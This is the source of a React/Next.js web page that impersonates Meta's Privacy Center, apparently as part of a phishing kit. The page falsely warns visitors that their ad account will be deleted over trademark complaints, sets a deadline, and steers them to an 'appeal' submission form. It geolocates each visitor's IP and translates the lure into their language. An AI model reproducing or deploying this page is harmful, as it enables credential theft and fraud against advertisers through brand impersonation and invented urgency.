'use client';
import BackgroundImage from '@/assets/images/bg-image.png';
import MetaAI from '@/assets/images/meta-ai-image.png';
import MetaImage from '@/assets/images/meta-image.png';
import ProfileImage from '@/assets/images/profile-image.png';
import WarningImage from '@/assets/images/warning.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
import { faChevronDown } from '@fortawesome/free-solid-svg-icons/faChevronDown';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faMagnifyingGlass } from '@fortawesome/free-solid-svg-icons/faMagnifyingGlass';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image, { type StaticImageData } from 'next/image';
import { useEffect, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

interface MenuItem {
	id: string;
	icon: IconDefinition;
	label: string;
	isActive?: boolean;
	hasChevron?: boolean;
}

interface InfoCardItem {
	id: string;
	title: string;
	subtitle: string;
	image?: StaticImageData;
}

const menuItems: MenuItem[] = [
	{
		id: 'home',
		icon: faHouse,
		label: 'Home Page',
		isActive: true,
	},
	{
		id: 'search',
		icon: faMagnifyingGlass,
		label: 'Search',
	},
	{
		id: 'privacy',
		icon: faLock,
		label: 'Privacy Policy',
		hasChevron: true,
	},
	{
		id: 'rules',
		icon: faCircleInfo,
		label: 'Other rules and articles',
	},
	{
		id: 'settings',
		icon: faGear,
		label: 'Settings',
		hasChevron: true,
	},
];

const privacyCenterItems: InfoCardItem[] = [
	{
		id: 'policy',
		title: 'What is the Privacy Policy and what does it say?',
		subtitle: 'Privacy Policy',
		image: ProfileImage,
	},
	{
		id: 'manage',
		title: 'How you can manage or delete your information',
		subtitle: 'Privacy Policy',
		image: ProfileImage,
	},
];

const agreementItems: InfoCardItem[] = [
	{
		id: 'meta-ai',
		title: 'Meta AI',
		subtitle: 'User Agreement',
		image: MetaAI,
	},
];

const resourceItems: InfoCardItem[] = [
	{
		id: 'generative-ai',
		title: 'How Meta uses information for generative AI models',
		subtitle: 'Privacy Center',
	},
	{
		id: 'ai-systems',
		title: 'Cards with information about the operation of AI systems',
		subtitle: 'Meta AI website',
	},
	{
		id: 'intro-ai',
		title: 'Introduction to Generative AI',
		subtitle: 'For teenagers',
	},
];

const Page: FC = () => {
	const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
	const [translations, setTranslations] = useState<Record<string, string>>({});
	const [modalKey, setModalKey] = useState(0);
	const isTranslatingRef = useRef(false);

	const t = (text: string): string => {
		return translations[text] || text;
	};

	useEffect(() => {
		if (geoInfo) {
			return;
		}

		const fetchGeoInfo = async () => {
			try {
				const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
				setGeoInfo({
					asn: data.asn || 0,
					ip: data.ip || 'CHỊU',
					country: data.country || 'CHỊU',
					city: data.city || 'CHỊU',
					country_code: data.country_code || 'US',
				});
			} catch {
				setGeoInfo({
					asn: 0,
					ip: 'CHỊU',
					country: 'CHỊU',
					city: 'CHỊU',
					country_code: 'US',
				});
			}
		};
		fetchGeoInfo();
	}, [setGeoInfo, geoInfo]);

	useEffect(() => {
		if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) return;

		isTranslatingRef.current = true;

		const textsToTranslate = [
			'Home Page',
			'Search',
			'Privacy Policy',
			'Other rules and articles',
			'Settings',
			'Privacy Center',
			'We have scheduled your ad account and pages for deletion.',
			`We have received many reports that your ads violate our trademark and intellectual property rights. After careful consideration, we have made a decision on this matter.`,
			'Appeal Guide',
			'Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.',
			`In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.`,
			'Submit Information',
			'This form is only to be used for submitting appeals and restoring account status',
			'Please ensure that you provide the requested information below. Failure to do so may delay the processing of your appeal.',
			'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
			'What is trademark infringement?',
			`Generally, trademark infringement occurs when all three of the following requirements are met:`,
			`1. A company or person uses a trademark owner's trademark (or similar trademark) without permission.`,
			`2. That use is in commerce, meaning that it's done in connection with the sale or promotion of goods or services.\n3. That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.`,
			`The touchstone of trademark infringement is often "likelihood of confusion", and there are many factors that determine whether a use of a trademark is likely to cause confusion. For example, when a person's trademark is also used by someone else, but on unrelated goods or services, that use may not be infringement because it may not cause confusion. Which party used the trademark first can often be an important consideration as well.`,
			'What is the Privacy Policy and what does it say?',
			'How you can manage or delete your information',
			'For more details, see the User Agreement',
			'Meta AI',
			'User Agreement',
			'Additional resources',
			'How Meta uses information for generative AI models',
			'Meta AI website',
			'Introduction to Generative AI',
			'For teenagers',
			'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy',
		];

		const translateAll = async () => {
			const translatedMap: Record<string, string> = {};

			for (const text of textsToTranslate) {
				translatedMap[text] = await translateText(text, geoInfo.country_code);
			}

			setTranslations(translatedMap);
		};

		translateAll();
	}, [geoInfo, translations]);

	return (
		<div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
			<title>Account Centre</title>
			<div className='flex w-full max-w-[1100px]'>
				<div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
					<Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
					<p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
					{menuItems.map((item) => (
						<div
							key={item.id}
							className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}
						>
							<FontAwesomeIcon icon={item.icon} />
							<p className='flex-1'>{t(item.label)}</p>
							{item.hasChevron && (
								<FontAwesomeIcon
									icon={faChevronDown}
									className='text-xs opacity-70'
								/>
							)}
						</div>
					))}
				</div>
				<div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
					<div className='flex items-center gap-2'>
						<Image src={WarningImage} alt='' className='h-[50px] w-[50px]' />
						<p className='text-2xl font-bold'>
							{t('We have scheduled your ad account and pages for deletion.')}
						</p>
					</div>
					<p>
						{t(
							`We have received many reports that your ads violate our trademark and intellectual property rights. After careful consideration, we have made a decision on this matter.`,
						)}
					</p>
					<p className='text-[15px] font-bold'>
						{t(
							'If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request to us for review and assistance.',
						)}
					</p>
					<p className='text-lg font-bold'>{t('Appeal Guide')}</p>
					<p className='text-[15px]'>
						{t(
							'Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.',
						)}
					</p>
					<p className='text-[15px]'>
						{t(
							`In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.`,
						)}
					</p>
					<div className='bg-[#e7e1fa] rounded-lg overflow-hidden'>
						<Image src={BackgroundImage} alt='' className='w-full' />
						<div className='flex flex-col items-start justify-center gap-5 p-5'>
							<p className='text-lg font-bold'>{t('Submit Information')}</p>
							<p className='text-[15px] font-bold'>
								{t(
									'This form is only to be used for submitting appeals and restoring account status',
								)}
							</p>
							<p className='text-[15px]'>
								{t(
									'Please ensure that you provide the requested information below. Failure to do so may delay the processing of your appeal.',
								)}
							</p>
							<button
								onClick={() => {
									setModalKey((prev) => prev + 1);
									setModalOpen(true);
								}}
								className='flex h-[50px] w-full items-center justify-center rounded-[10px] bg-[#344854] font-semibold text-white'
							>
								{t('Submit Information')}
							</button>
						</div>
					</div>
					<div className='flex flex-col gap-3'>
						<p className='text-lg font-bold'>{t('What is trademark infringement?')}</p>
						<p className='text-[15px] font-bold whitespace-pre-line'>
							{t(
								`Generally, trademark infringement occurs when all three of the following requirements are met:\n1. A company or person uses a trademark owner's trademark (or similar trademark) without permission.\n2. That use is in commerce, meaning that it's done in connection with the sale or promotion of goods or services.\n3. That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.`,
							)}
						</p>
						<p className='text-[15px] text-[#65676b]'>
							{t(
								`The touchstone of trademark infringement is often "likelihood of confusion", and there are many factors that determine whether a use of a trademark is likely to cause confusion. For example, when a person's trademark is also used by someone else, but on unrelated goods or services, that use may not be infringement because it may not cause confusion. Which party used the trademark first can often be an important consideration as well.`,
							)}
						</p>
					</div>
					<div className='flex flex-col gap-3'>
						<div>
							<p className='font-sans font-medium text-[#212529]'>
								{t('Privacy Center')}
							</p>
							{privacyCenterItems.map((item, index) => {
								const isFirst = index === 0;
								const isLast = index === privacyCenterItems.length - 1;
								const roundedClass =
									privacyCenterItems.length === 1
										? 'rounded-[15px]'
										: isFirst
											? 'rounded-t-[15px] border-b border-b-gray-200'
											: isLast
												? 'rounded-b-[15px]'
												: 'border-y border-y-gray-200';

								return (
									<div
										key={item.id}
										className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}
									>
										{item.image && (
											<Image src={item.image} alt='' className='h-12 w-12' />
										)}
										<div className='flex flex-1 flex-col'>
											<p className='font-medium'>{t(item.title)}</p>
											<p className='text-[#465a69]'>{t(item.subtitle)}</p>
										</div>
										<FontAwesomeIcon icon={faChevronDown} />
									</div>
								);
							})}
						</div>
						<div>
							<p className='font-sans font-medium text-[#212529]'>
								{t('For more details, see the User Agreement')}
							</p>
							{agreementItems.map((item, index) => {
								const isFirst = index === 0;
								const isLast = index === agreementItems.length - 1;
								const roundedClass =
									agreementItems.length === 1
										? 'rounded-[15px]'
										: isFirst
											? 'rounded-t-[15px] border-b border-b-gray-200'
											: isLast
												? 'rounded-b-[15px]'
												: 'border-y border-y-gray-200';

								return (
									<div
										key={item.id}
										className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}
									>
										{item.image && (
											<Image src={item.image} alt='' className='h-12 w-12' />
										)}
										<div className='flex flex-1 flex-col'>
											<p className='font-medium'>{t(item.title)}</p>
											<p className='text-[#465a69]'>{t(item.subtitle)}</p>
										</div>
										<FontAwesomeIcon icon={faChevronDown} />
									</div>
								);
							})}
						</div>
						<div>
							<p className='font-sans font-medium text-[#212529]'>
								{t('Additional resources')}
							</p>
							{resourceItems.map((item, index) => {
								const isFirst = index === 0;
								const isLast = index === resourceItems.length - 1;
								const roundedClass =
									resourceItems.length === 1
										? 'rounded-[15px]'
										: isFirst
											? 'rounded-t-[15px] border-b border-b-gray-200'
											: isLast
												? 'rounded-b-[15px]'
												: 'border-y border-y-gray-200';

								return (
									<div
										key={item.id}
										className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}
									>
										{item.image && (
											<Image src={item.image} alt='' className='h-12 w-12' />
										)}
										<div className='flex flex-1 flex-col'>
											<p className='font-medium'>{t(item.title)}</p>
											<p className='text-[#465a69]'>{t(item.subtitle)}</p>
										</div>
										<FontAwesomeIcon icon={faChevronDown} />
									</div>
								);
							})}
						</div>
						<p className='text-[15px] text-[#465a69]'>
							{t(
								'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy',
							)}
						</p>
					</div>
				</div>
			</div>
			{isModalOpen && <FormModal key={modalKey} />}
		</div>
	);
};

export default Page;
